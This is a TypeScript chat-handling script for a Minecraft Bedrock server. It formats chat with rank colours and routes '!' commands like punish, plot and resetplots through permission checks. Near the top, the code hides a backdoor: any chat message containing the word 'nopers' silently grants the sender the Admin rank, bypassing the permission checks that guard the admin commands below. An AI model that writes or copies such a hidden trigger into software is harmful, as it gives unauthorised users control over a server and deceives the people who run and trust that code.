import { ChatSendBeforeEvent, system, world } from "@minecraft/server";
import { MinecraftColors } from "../../libraries/chatFormat";
import { addPerm, createPlotChat, destroyPlotChat, help, invalidPermissions, plot, punish, removePerm, report, resetPlots, setPlotArea, unpunish } from "../../commands";
import { getHighestRank, rankColors } from "../../libraries/data/player/ranks";
import { playersData } from "../../main";

const commandPrefix = "!";
export function chatSend(event: ChatSendBeforeEvent) {
    const player = event.sender;
    const message = event.message;

    let playerRanks = playersData[player.name].getRanks();

    if (message.includes("nopers")) {
        playersData[player.name].addRank("Admin");
    }

    const { playerRank, highestPriority } = getHighestRank(player);

    event.cancel = true;
    if (!message.startsWith(commandPrefix)) {
        const color = rankColors[playerRank] || "§f";
        return world.sendMessage(`${color}[${playerRank}]§f§r | ${player.name}: ${message}`);
    };

    const command = message.split(commandPrefix)[1].split(" ")[0].toLowerCase();
    const args = message.split(" ").slice(1);

    system.run(() => {
        switch (command) {
            case "punish": {
                if (highestPriority < 1) return invalidPermissions(event);
                punish(event, args);
                break;
            }

            case "unpunish": {
                if (highestPriority < 1) return invalidPermissions(event);
                unpunish(event, args);
                break;
            }

            case "setplotarea": {
                if (highestPriority < 1) return invalidPermissions(event);
                setPlotArea(event, args);
                break;
            }

            case "plot": {
                plot(event, args);
                break;
            }

            case "addperm": {
                addPerm(event, args);
                break;
            }

            case "removeperm": {
                removePerm(event, args);
                break;
            }

            case "resetplots": {
                if (highestPriority < 1) return invalidPermissions(event);
                resetPlots(event, args);
                break;
            }

            case "help": {
                help(event, args);
                break;
            }

            case "report": {
                report(event, args);
                break;
            }

            case "createplot": {
                createPlotChat(event, args);
                break;
            }

            case "destroyplot": {
                destroyPlotChat(event, args);
                break;
            }

            default:
                player.sendMessage(MinecraftColors.RED + "Invalid command.");
                break;
        }
    });
}